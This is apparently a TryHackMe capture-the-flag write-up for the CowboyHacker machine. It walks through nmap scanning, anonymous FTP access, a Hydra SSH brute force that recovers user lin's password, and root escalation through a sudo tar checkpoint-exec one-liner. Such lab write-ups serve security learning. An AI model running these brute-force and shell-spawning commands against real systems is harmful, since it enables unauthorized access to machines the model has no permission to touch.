CowboyHacker - TryHackMe Writeup

By Svfear | 90 Days of Machines Challenge

🧠 Introduction

This write-up covers the CowboyHacker machine from TryHackMe. The goal was to enumerate the system, gain user access, and escalate privileges to root.

🔍 Nmap Scan

nmap -sV -sS -sC 10.10.16.96 -oA bounty_hacker

Open ports found:

  • 21/tcp - FTP (vsFTPd 3.0.5)
  • 22/tcp - SSH (OpenSSH 8.2p1)
  • 80/tcp - HTTP (Apache 2.4.41)

📂 FTP Enumeration

ftp 10.10.16.96
Connected to 10.10.16.96.
220 (vsFTPd 3.0.5)
Name (10.10.16.96:svfear): anonymous

Anonymous login was allowed. Listing files:

-rw-rw-r--    1 ftp ftp 418 Jun 07 2020 locks.txt
-rw-rw-r--    1 ftp ftp 68  Jun 07 2020 task.txt

The task.txt file revealed the username lin, and locks.txt appeared to be a password wordlist.

🔑 Brute-forcing SSH with Hydra

hydra -l lin -P locks.txt 10.10.16.96 ssh

Hydra found valid credentials:

lin : RedDr4gonSynd1cat3

💻 Gaining User Access

ssh lin@10.10.16.96
lin@ip-10-10-16-96:~/Desktop$ ls
user.txt

🚀 Privilege Escalation

Checking sudo permissions:

sudo -l
User lin may run the following commands on ip-10-10-16-96:
    (root) /bin/tar

Using GTFOBins, we found a tar exploit to gain root:

sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

Success! We are root.

# cd /root
# ls
root.txt  snap

🏁 Conclusion

CowboyHacker was a fun and straightforward beginner machine focusing on service enumeration, basic brute-force, and privilege escalation via tar.

✅ Skills Practiced: FTP enumeration, Hydra brute-force, SSH access, and privilege escalation.
